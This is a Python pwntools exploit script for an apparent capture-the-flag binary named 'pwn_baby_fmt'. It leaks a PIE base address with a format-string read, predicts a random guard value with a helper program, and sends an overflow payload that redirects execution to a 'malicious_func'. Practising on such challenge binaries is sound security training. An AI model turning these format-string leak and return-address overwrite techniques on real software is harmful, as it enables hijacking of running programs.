from pwn import *
from subprocess import *

# context.log_level = "CRITICAL"

IP = "35.234.100.160"
port = 32136

# found offest using radare2 : r2 -d -A pwn_baby_fmt,  then %14$p
offfset = 0x5651872ba1c0 - 0x5651872b9000
global_var_offset = 0x0000402c - 0x000013a8 #offset from rand
malicious_func_offset = 0x0000133b - 0x000011c0 #offset from entry
# found PIE at index=10
# found our random variable at index = 9

def leak_addresses(i, delay):

    elf = ELF("./pwn_baby_fmt")
    context.binary = elf
    p = elf.process()
    # p = remote(IP, port)
    gdb.attach(p, gdbscript='''b gets@plt''')

    p.recvuntil("What's your town?\n")
    input = f"%{i}$p"
    p.sendline(input)
    p.recvuntil("Hello stranger. What town is this?\n")
    response = p.recvuntil("\n").rstrip()
    # if(response != b'(nil)'):
    # print(f"hex: {response}")
    leaked_addr = int(response, base=16)
    elf.address = leaked_addr - offfset
    print(f"{i}: {leaked_addr}")
    print(f"found base address: {elf.address}")
    
    # print(elf.bss())
    # for off in range(1000):
    #     random_nr = elf.read(elf.bss(off), 1)
    #     print(f"{off}: {random_nr}")
    
    print("delay: ", delay)
    c_process = Popen(['./exploit_rand', str(delay)], stdout=PIPE)
    random_nr = int(c_process.stdout.readline().strip())
    print("found random number: ", random_nr)

    malicious_func = elf.entry + malicious_func_offset

    payload = [
        5*b"A",
        p64(random_nr),
        24*b"B",
        p64(malicious_func)   
    ]

    payload = b"".join(payload)
    p.recvuntil("Can you say hi in Chalcatongo?\n\n")
    p.sendline(payload)
    
    p.interactive()


for d in range(10):
    leak_addresses(10, d)
# leak_addresses(10, 20)    